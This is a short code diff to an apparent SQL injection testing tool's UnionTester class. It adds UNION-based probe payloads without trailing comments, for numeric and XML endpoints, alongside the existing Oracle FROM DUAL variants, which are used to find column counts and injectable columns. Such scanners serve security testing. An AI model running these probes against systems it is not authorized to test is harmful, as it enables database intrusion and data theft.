@@ -67,7 +67,14 @@ export class UnionTester {
         dbms: 'Generic SQL',
       });
 
-      // 2. Oracle (strictly requires FROM DUAL)
+      // 2. Generic ANSI SQL (No trailing comment, optimal for integer/XML endpoints)
+      probes.push({
+        columnCount: c,
+        payload: `${prefix}${nulls}`,
+        dbms: 'Generic SQL',
+      });
+
+      // 3. Oracle (strictly requires FROM DUAL)
       probes.push({
         columnCount: c,
         payload: `${prefix}${nulls} FROM DUAL--`,
@@ -121,6 +128,17 @@ export class UnionTester {
         payload: `${prefix}${rowCells.join(',')}-- -`,
         dbms: 'Generic SQL',
       });
+
+      // 1B. Generic SQL without trailing comment
+      if (isNum) {
+        probes.push({
+          columnCount,
+          targetColumnIndex: col,
+          canaryMarker: marker,
+          payload: `${prefix}${rowCells.join(',')}`,
+          dbms: 'Generic SQL',
+        });
+      }
 
       // 2. Oracle (FROM DUAL)
       probes.push({
